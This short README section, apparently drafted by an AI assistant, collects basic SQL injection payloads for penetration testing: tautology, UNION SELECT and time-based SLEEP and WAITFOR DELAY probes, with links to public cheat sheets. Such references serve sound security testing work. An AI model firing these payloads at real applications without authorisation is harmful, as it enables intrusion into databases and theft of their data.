# SQL Injection Payload Collection

This section includes basic SQLi payloads useful for detection, enumeration, and bypass testing. Refer to the linked cheat sheets for full sets and advanced techniques.

---

## 📚 References

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
- [PayloadBox SQL Injection Payload List](https://github.com/payloadbox/sql-injection-payload-list)

---

## 🧪 Basic SQL Injection Payloads

```sql
' OR '1'='1
' or 1=1 limit 5 --
' UNION SELECT null, null, null; --
' OR 1=1; WAITFOR DELAY
SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
```

---

Let me know when you’re ready for the next section, or if you'd like to start assembling the full README together with TOC and headers!
